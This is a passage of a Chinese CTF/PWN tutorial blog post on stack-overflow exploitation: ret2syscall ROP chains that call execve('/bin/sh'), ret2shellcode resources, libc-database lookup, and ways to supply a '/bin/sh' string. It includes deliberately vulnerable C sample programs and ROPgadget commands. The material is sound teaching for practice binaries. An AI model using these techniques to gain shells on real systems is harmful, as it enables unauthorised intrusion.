+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330200027207.png" alt="image-20240330200027207"></p>
+<h2 id="例题1-3"><a class="markdownIt-Anchor" href="#例题1-3"></a> 例题1</h2>
+<ul>
+<li>
+<p>64位的程序，gcc编译</p>
+</li>
+<li>
+<p>程序源码</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;input:&quot;</span>,<span class="number">6</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;bye&quot;</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall"></a> ret2syscall</h1>
+<ul>
+<li>syscall就是中断</li>
+<li>64位是syscall，32位的是in0x80</li>
+</ul>
+<h2 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h2>
+<ul>
+<li>
+<p>当程序是静态编译的情况，并没有libc库的情况</p>
+</li>
+<li>
+<p>静态编译指令</p>
+<ul>
+<li><code>gcc question_5.c -fno-stack-protector -no-pie -static -o question_5_x64</code></li>
+<li><code> gcc question_5.c -fno-stack-protector -no-pie -static -o question_5_x64</code></li>
+</ul>
+</li>
+<li>
+<p>静态编译不再解释，在该篇博客gcc入门有介绍静态编译<a href="https://iyheart.github.io/2024/03/05/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%85%A5%E9%97%A8/">PWN入门 | iyheart的博客</a></p>
+</li>
+<li>
+<p>静态编译的程序，调用时就不会跳来跳去，而是直接跳转的被调用程序的地址处</p>
+</li>
+<li>
+<p>这种情况下就程序就没有system函数了</p>
+</li>
+</ul>
+<h2 id="system函数的实现过程"><a class="markdownIt-Anchor" href="#system函数的实现过程"></a> system函数的实现过程</h2>
+<ul>
+<li>
+<p>可以去看看源码：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source">Linux source code (v6.8.2) - Bootlin</a></p>
+</li>
+<li>
+<p>既然没有system函数，那么就要另找出路了，这时就需要知道system函数具体是怎么实现的</p>
+</li>
+<li>
+<p>在实行system函数的时候会跳转到俩个地方，一个是<strong>loc_522A0</strong>另一个是<strong>sub_51CD0</strong>,而在<strong>sub_51CD0</strong>的下方一点，有会看到字串**/bin/sh**</p>
+</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331155405550.png" alt="image-20240331155405550"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331155319795.png" alt="image-20240331155319795"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331155742669.png" alt="image-20240331155742669"></p>
+<h3 id="system反编译代码"><a class="markdownIt-Anchor" href="#system反编译代码"></a> system反编译代码</h3>
+<ul>
+<li>下图为system函数的反编译代码，会更直观</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331155848699.png" alt="image-20240331155848699"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331160251265.png" alt="image-20240331160251265"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331160318413.png" alt="image-20240331160318413"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331160343240.png" alt="image-20240331160343240"></p>
+<ul>
+<li>最后会发现跳转到<strong>sys_execve</strong>函数就不会跳转了，查看这行代码的反汇编，会发现<strong>syscall</strong></li>
+<li>所以system函数核心是执行<strong>execve</strong>函数，而<strong>execve</strong>函数的核心又为<strong>syscall</strong></li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331160356224.png" alt="image-20240331160356224"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331160621214.png" alt="image-20240331160621214"></p>
+<h3 id="execve函数"><a class="markdownIt-Anchor" href="#execve函数"></a> execve函数</h3>
+<p><code>int execve(const char * filename,char * const argv[ ],char * const envp[ ]);</code></p>
+<ul>
+<li>execve函数有三个参数
+<ul>
+<li>第一个参数：需要执行文件的文件名</li>
+<li>第二个参数：执行文件的参数</li>
+<li>第三个参数：执行文件的环境</li>
+<li>通常来说只输入可执行文件名，那么其他俩个参数都默认为0</li>
+</ul>
+</li>
+<li>这时当没有system函数时，就栈溢出返回到该函数，并且设置第一个参数为**/bin/sh**，第二个参数为0，第三个参数也为0，这样就可以得到shell</li>
+<li>查看system函数源码</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331161729441.png" alt="image-20240331161729441"></p>
+<h3 id="漏洞思路-2"><a class="markdownIt-Anchor" href="#漏洞思路-2"></a> 漏洞思路</h3>
+<ul>
+<li>在静态编译中寻找<strong>execve函数</strong>或者寻找<strong>syscall函数</strong></li>
+<li>查找发现例题1没有execve函数和字串，也没有syscall函数，但是有syscall的字串而且该字串在text段，而且syscall字串还不只一个，这就需要去花时间寻找正确的syscall</li>
+<li>模仿execve调用syscall，最终执行/bin/sh</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331162011876.png" alt="image-20240331162011876"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331162202819.png" alt="image-20240331162202819"></p>
+<ul>
+<li>这时可以使用ROPgadget去寻找syscall，注意：寻找的syscall有时后面需要跟一个ret，要不然ROP链布置不了</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331162523267.png" alt="image-20240331162523267"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331162652981.png" alt="image-20240331162652981"></p>
+<h3 id="布栈思路"><a class="markdownIt-Anchor" href="#布栈思路"></a> 布栈思路</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">重点：当调用syscall的时候</span><br><span class="line">rax标志着syscall所要使用的中断号</span><br><span class="line">如果要执行execve这个程序，那么这个中断号就要为0x3b</span><br><span class="line">那么就要让rax = 0x3b</span><br><span class="line">其参数rdi = &#x27;/bin/sh&#x27;  rsi = 0 rdx = 0</span><br><span class="line">一般程序里面都会有/bin/sh字串</span><br><span class="line">没有的话也可以找/sh作为参数（注意必须要以sh结尾的字串）</span><br><span class="line"></span><br><span class="line">布置栈的思路</span><br><span class="line">pop_rax_ret</span><br><span class="line">pop_rdi_ret</span><br><span class="line">pop_rsi_ret</span><br><span class="line">pop_rdx_ret</span><br><span class="line">syscall_addr</span><br><span class="line">或者</span><br><span class="line">pop_rax_rdi_rsi_rdx_ret_addr</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331163835208.png" alt="image-20240331163835208"></p>
+<h2 id="例题1-4"><a class="markdownIt-Anchor" href="#例题1-4"></a> 例题1</h2>
+<ul>
+<li>
+<p>静态编译是不需要泄露地址的，直接ROP打就行</p>
+</li>
+<li>
+<p>64位静态编译</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;input:&quot;</span>,<span class="number">6</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);<span class="comment">//gets(b);</span></span><br><span class="line">        <span class="built_in">puts</span>(b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>先使用<code> ROPgadget --binary question_5_x64_static --only 'syscall'</code>查看syscall所在的地址</p>
+</li>
+<li>
+<p>再使用<code> ROPgadget --binary question_5_x64_static --only 'pop|ret'</code>查看ROP链，需要的是<code>rax rdi rsi rdx</code></p>
+</li>
+</ul>
+<h2 id="例题2-3"><a class="markdownIt-Anchor" href="#例题2-3"></a> 例题2</h2>
+<ul>
+<li>32位，静态编译，源码同例题1。</li>
+<li>主要也是传递参数的区别，系统调用号也是看eax的，32位的execve系统调用号是11也就是0xB，而参数传递的是用栈，但是参数最终会传递给寄存器。寄存器接受参数就是<code>第一个参数 ebx ，第二个参数ecx，第三个参数 edx</code>，系统中断也不是syscall，而是<strong>int0x80</strong>，十六进制指令为<strong>cd 80</strong></li>
+<li>有的时候32位也需要构造ROP链</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331172500425.png" alt="image-20240331172500425"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331173346868.png" alt="image-20240331173346868"></p>
+<h1 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h1>
+<ul>
+<li>
+<p>shellcode大全：<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)</a></p>
+</li>
+<li>
+<p>shellcode生成工具alpha3：<a target="_blank" rel="noopener" href="https://github.com/Skylined/alpha3">https://github.com/Skylined/alpha3</a></p>
+</li>
+<li>
+<p>主要就是如何去构造shellcode</p>
+</li>
+<li>
+<p>三个方向</p>
+<ul>
+<li>长度</li>
+<li>字符：<strong>字符的数量</strong>、<strong>可显字符串</strong>、<strong>不可显字符串</strong></li>
+</ul>
+</li>
+</ul>
+<h1 id="题目没有libc库"><a class="markdownIt-Anchor" href="#题目没有libc库"></a> 题目没有libc库</h1>
+<ul>
+<li>有些题目不会给libc库，这时就要借助在线的libc库或者离线的工具对libc库进行还原</li>
+</ul>
+<h2 id="libc-database"><a class="markdownIt-Anchor" href="#libc-database"></a> libc-database</h2>
+<ul>
+<li>网址：<a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a></li>
+<li>先构造ROP链，多泄露几个地址，就可以在该网站上检索出来libc库的版本</li>
+<li>然后可以确定system的偏移量、/bin/sh的偏移量等</li>
+</ul>
+<h2 id="libc-database下载到本地"><a class="markdownIt-Anchor" href="#libc-database下载到本地"></a> libc-database下载到本地</h2>
+<ul>
+<li>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sta8r9/p/18119516">将libc database下载到本地 - Sta8r9 - 博客园 (cnblogs.com)</a></p>
+</li>
+<li>
+<p>去github上下载项目：<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">niklasb/libc-database: Build a database of libc offsets to simplify exploitation (github.com)</a></p>
+</li>
+</ul>
+<img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517193338225.png" alt="image-20240517193338225" style="zoom: 50%;">
+<ul>
+<li>下载解压后将该文件放入Linux里面，然后进入该文件<code>libc-database-master</code></li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517193448619.png" alt="image-20240517193448619"></p>
+<ul>
+<li>然后输入命令，就会将大量的libc文件下载到<code>libc-database-master</code>目录的<code>db</code>文件夹里面</li>
+<li>注意这个下载需要一两个小时，会比较慢，但是下载完总的文件大小没到1G，不是很大</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./get ubuntu</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517193803433.png" alt="image-20240517193803433"></p>
+<ul>
+<li>下载好后进入<code>db</code>文件夹</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517193858296.png" alt="image-20240517193858296"></p>
+<ul>
+<li>支持的命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find 用于根据符号和偏移查找libc版本，打印libc ID。</span><br><span class="line">dump 用于转储查到的libc库中的一些常用符号和偏移，也可以通过指定符号转储偏移。</span><br><span class="line">add 用于手动添加一些libc库到db。</span><br><span class="line">identify 用于判断某个libc是否已经存在于db，支持hash查找。</span><br><span class="line">download 用于下载与libc ID相对应的整个libc到libs目录。</span><br><span class="line">get 下载libc到db，用于初始化于更新libc database。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里先泄露一个puts函数的libc地址，作为例子</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517195047711.png" alt="image-20240517195047711"></p>
+<h1 id="数据溢出"><a class="markdownIt-Anchor" href="#数据溢出"></a> 数据溢出</h1>
+<p>通常为整数溢出和浮点数溢出</p>
+<p>或者格式化字符串漏洞</p>
+<ul>
+<li>数据存储格式</li>
+<li>数据取值范围</li>
+<li>数据基本运算</li>
+</ul>
+<h1 id="没有binsh怎么办"><a class="markdownIt-Anchor" href="#没有binsh怎么办"></a> 没有/bin/sh怎么办</h1>
+<ul>
+<li>/bin/sh的机器码</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240517192433223.png" alt="image-20240517192433223"></p>
+<h2 id="自己写binsh"><a class="markdownIt-Anchor" href="#自己写binsh"></a> 自己写/bin/sh</h2>
+<ul>
+<li>利用Python脚本和栈溢出，写出/bin/sh再输入到栈里面，这样就有/bin/sh，调用system函数的时候就有参数了</li>
+<li>调用的system函数后面一定要有ret，要不然调用不了第二次，就没办法获取权限</li>
+</ul>
+<h3 id="写binsh的地方"><a class="markdownIt-Anchor" href="#写binsh的地方"></a> 写/bin/sh的地方</h3>
+<ul>
+<li>向可写段写入/bin/sh，注意有align（对齐）是一定可以写的</li>
+</ul>
+<h3 id="怎么去写入binsh"><a class="markdownIt-Anchor" href="#怎么去写入binsh"></a> 怎么去写入/bin/sh</h3>
+<ul>
+<li>利用syscall的参数0去写入/bin/sh</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240331171128738.png" alt="image-20240331171128738"></p>
+<h2 id="程序找sh"><a class="markdownIt-Anchor" href="#程序找sh"></a> 程序找/sh</h2>
+<ul>
+<li>利用程序现成的字串，去找以sh结尾的字符串，必须是sh结尾，这样读到空字符就不会再往下读取了</li>
+</ul>
+<h2 id="程序中找0"><a class="markdownIt-Anchor" href="#程序中找0"></a> 程序中找$0</h2>
+<ul>
+<li>$0对应的机器码是24 30</li>
+<li>在24 30之后必须跟空字符，即<code> 24 30 00</code></li>
+</ul>
+<h1 id="权限保护问题"><a class="markdownIt-Anchor" href="#权限保护问题"></a> 权限保护问题</h1>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://iyheart.github.io">iyheart</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://iyheart.github.io/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/">http://iyheart.github.io/2024/03/22/PWN系列blog/5PWN-栈溢出基础/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://iyheart.github.io" target="_blank">iyheart的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover13.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" target="_blank"><img class="post-qr-code-img" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/28/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E6%95%B0%E4%B8%8B%E7%AC%AC%E4%B9%9D%E7%AB%A0/" title="高数下第九章"><img class="cover" src="https://i0.hdslb.com/bfs/article/296da5370e6f915d1826ff20916e7aec16f21482.jpg" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">高数下第九章</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Python%E7%B3%BB%E5%88%97blog/python%E6%A8%A1%E5%9D%97%E5%92%8C%E5%BA%93/" title="python模块和库"><img class="cover" src="https://i0.hdslb.com/bfs/article/296da5370e6f915d1826ff20916e7aec16f21482.jpg" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">python模块和库</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/05/10/PWN%E7%B3%BB%E5%88%97blog/11PWN-%E6%B2%99%E7%AE%B1/" title="PWN-沙箱"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/下载.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-10</div><div class="title">PWN-沙箱</div></div></a></div><div><a href="/2024/05/10/PWN%E7%B3%BB%E5%88%97blog/10PWN-C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="PWN-C语言函数分析"><img class="cover" src="https://i0.hdslb.com/bfs/article/296da5370e6f915d1826ff20916e7aec16f21482.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-10</div><div class="title">PWN-C语言函数分析</div></div></a></div><div><a href="/2024/03/18/PWN%E7%B3%BB%E5%88%97blog/4pwn%E9%A2%98%E7%9B%AE%E9%83%A8%E7%BD%B2/" title="PWN题目部署"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PWN题目部署</div></div></a></div><div><a href="/2024/03/10/PWN%E7%B3%BB%E5%88%97blog/2pwntools%E4%BD%BF%E7%94%A8/" title="pwntools使用"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-10</div><div class="title">pwntools使用</div></div></a></div><div><a href="/2024/03/17/PWN%E7%B3%BB%E5%88%97blog/3PWN%E5%9F%BA%E7%A1%80/" title="PWN基础"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-17</div><div class="title">PWN基础</div></div></a></div><div><a href="/2024/03/05/PWN%E7%B3%BB%E5%88%97blog/1PWN%E5%85%A5%E9%97%A8/" title="PWN入门"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-05</div><div class="title">PWN入门</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81OTQ1Mi8zNTkxNA=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">iyheart</div><div class="author-info__description">悟已往之不谏，知来者之可追</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-number">1.1.</span> <span class="toc-text"> 内存虚拟地址空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.</span> <span class="toc-text"> 偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88"><span class="toc-number">1.3.</span> <span class="toc-text"> 栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">1.4.</span> <span class="toc-text"> 堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82"><span class="toc-number">1.5.</span> <span class="toc-text"> 函数传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret%E7%B3%BB%E5%88%97%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.</span> <span class="toc-text"> ret系列思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2text"><span class="toc-number">2.</span> <span class="toc-text"> ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.1.</span> <span class="toc-text"> 例题1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 查看程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%96%E5%85%A5ida"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 拖入IDA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gdb%E5%8A%A8%E8%B0%83"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 使用gdb动调</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.5.</span> <span class="toc-text"> exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A1"><span class="toc-number">2.2.</span> <span class="toc-text"> 作业1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 